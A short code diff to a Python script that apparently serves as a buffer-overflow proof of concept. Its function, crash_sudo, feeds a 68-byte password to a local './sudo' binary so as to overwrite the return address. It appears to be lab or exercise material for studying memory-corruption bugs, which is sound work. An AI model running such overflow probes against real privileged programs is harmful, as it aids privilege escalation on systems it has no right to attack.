@@ -1,14 +1,15 @@
-import os, sys
+import os, sys, subprocess
 
 
 PATH_TO_SUDO = './sudo'
 
 
 def crash_sudo():
-	cmd = "ls" # arbitrary, just used to follow the proper usage of the program 
-	password = "A" * 63 # we need at least 63 bytes to overflow RET register
-	cmd_to_run = PATH_TO_SUDO + " " + password + " " + "\"" + cmd + "\"" # escape with parentheses
-	os.system(cmd_to_run)
+	cmd = "pwd" # arbitrary, just used to follow the proper usage of the program 
+	password = "A" * 67 # we need at least 67 bytes to overflow RET register (python adds null char at the end of string)
+	password += "z"
+	print password
+	subprocess.call([PATH_TO_SUDO, password, cmd])
 	return
 
 
